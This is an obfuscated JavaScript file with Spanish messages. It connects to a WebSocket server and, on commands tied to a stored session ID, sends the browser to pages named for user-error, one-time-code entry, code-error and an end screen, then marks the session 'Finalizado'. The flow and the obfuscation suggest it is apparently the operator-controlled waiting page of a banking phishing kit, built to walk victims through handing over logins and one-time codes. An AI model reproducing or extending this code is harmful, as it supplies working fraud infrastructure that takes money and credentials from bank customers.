const _0x13b00e = _0x5255;
(function (_0x5a01dc, _0x1968d5) {
  const _0x24a598 = _0x5255,
    _0x34c28f = _0x5a01dc();
  while (!![]) {
    try {
      const _0x458be1 =
        (-parseInt(_0x24a598(0x17e)) / 0x1) *
          (-parseInt(_0x24a598(0x169)) / 0x2) +
        parseInt(_0x24a598(0x16a)) / 0x3 +
        (-parseInt(_0x24a598(0x184)) / 0x4) *
          (parseInt(_0x24a598(0x176)) / 0x5) +
        (parseInt(_0x24a598(0x160)) / 0x6) *
          (parseInt(_0x24a598(0x178)) / 0x7) +
        (parseInt(_0x24a598(0x174)) / 0x8) *
          (-parseInt(_0x24a598(0x17f)) / 0x9) +
        -parseInt(_0x24a598(0x17b)) / 0xa +
        (parseInt(_0x24a598(0x185)) / 0xb) * (parseInt(_0x24a598(0x164)) / 0xc);
      if (_0x458be1 === _0x1968d5) break;
      else _0x34c28f["push"](_0x34c28f["shift"]());
    } catch (_0xf892a6) {
      _0x34c28f["push"](_0x34c28f["shift"]());
    }
  }
})(_0x3235, 0x323e4);
const dataLogId = localStorage[_0x13b00e(0x16d)](_0x13b00e(0x161)),
  token = localStorage["getItem"](_0x13b00e(0x16c));
(!dataLogId || !token) &&
  (console[_0x13b00e(0x17d)](
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage."
  ),
  alert(_0x13b00e(0x179)),
  (window[_0x13b00e(0x170)][_0x13b00e(0x168)] = "./error.html"));
function _0x5255(_0x21fa6b, _0x72142) {
  const _0x3235c8 = _0x3235();
  return (
    (_0x5255 = function (_0x52551a, _0x338744) {
      _0x52551a = _0x52551a - 0x15f;
      let _0x520fff = _0x3235c8[_0x52551a];
      return _0x520fff;
    }),
    _0x5255(_0x21fa6b, _0x72142)
  );
}
function _0x3235() {
  const _0x29a28b = [
    "./index.error.html",
    "connect_error",
    "location",
    "valid",
    "./otp.error.html",
    "../end.html",
    "24hdMxyR",
    "data",
    "27655VvkgQt",
    "Datos\x20recibidos:",
    "524377ybgkBo",
    "Hubo\x20un\x20error\x20al\x20cargar\x20los\x20datos.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "application/json",
    "2834770XohqOK",
    "Error\x20al\x20actualizar\x20el\x20estado:",
    "error",
    "1eSSJil",
    "3330URylJq",
    "stringify",
    "/dataLogs/updateEndDataLog/",
    "valor",
    "Error\x20de\x20conexión:",
    "28iAnIQp",
    "601843OZTebD",
    "origin",
    "Bearer\x20",
    "24DSLdXN",
    "dataLogId",
    "Hubo\x20un\x20error\x20al\x20actualizar\x20el\x20estado.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "Estado\x20actualizado\x20correctamente\x20en\x20el\x20servidor.",
    "12zOQamA",
    "log",
    "Error\x20en\x20el\x20PUT\x20a\x20updateEndDataLog",
    "PUT",
    "href",
    "182258VYikss",
    "250842OxAKiI",
    "Finalizado",
    "dataLogToken",
    "getItem",
  ];
  _0x3235 = function () {
    return _0x29a28b;
  };
  return _0x3235();
}
const socket = io(url, { query: { token: token } });
socket["on"]("connect", () =>
  console[_0x13b00e(0x165)]("Conectado\x20al\x20WebSocket")
),
  socket["on"](_0x13b00e(0x16f), (_0x2bac9e) =>
    console[_0x13b00e(0x17d)](_0x13b00e(0x183), _0x2bac9e["message"])
  ),
  socket["on"](_0x13b00e(0x175), async (_0x57c7e1) => {
    const _0x378287 = _0x13b00e;
    console["log"](_0x378287(0x177), _0x57c7e1),
      console[_0x378287(0x165)]("ID\x20de\x20dataLog:", dataLogId);
    if (String(_0x57c7e1[_0x378287(0x171)]) !== String(dataLogId)) return;
    const _0x2b7714 = {
      us: _0x378287(0x16e),
      din: "./otp.html",
      new_din: _0x378287(0x172),
      end: _0x378287(0x173),
    };
    if (_0x57c7e1[_0x378287(0x182)] in _0x2b7714) {
      if (_0x57c7e1[_0x378287(0x182)] === "end")
        try {
          await updateStatus();
        } catch (_0x58e8dc) {
          console[_0x378287(0x17d)](_0x378287(0x17c), _0x58e8dc),
            alert(_0x378287(0x162));
          return;
        }
      window[_0x378287(0x170)][_0x378287(0x168)] =
        _0x2b7714[_0x57c7e1[_0x378287(0x182)]];
    }
  });
async function updateStatus() {
  const _0x536339 = _0x13b00e;
  try {
    const _0x1ea93d = await fetch(url + _0x536339(0x181) + dataLogId, {
      method: _0x536339(0x167),
      headers: {
        "Content-Type": _0x536339(0x17a),
        Authorization: _0x536339(0x15f) + token,
        Origin: window[_0x536339(0x170)][_0x536339(0x186)],
      },
      body: JSON[_0x536339(0x180)]({ status: _0x536339(0x16b) }),
    });
    if (!_0x1ea93d["ok"]) {
      const _0x2521d4 = await _0x1ea93d["json"]();
      throw new Error(_0x2521d4[_0x536339(0x17d)] || _0x536339(0x166));
    }
    console["log"](_0x536339(0x163));
  } catch (_0x1c0daf) {
    throw _0x1c0daf;
  }
}
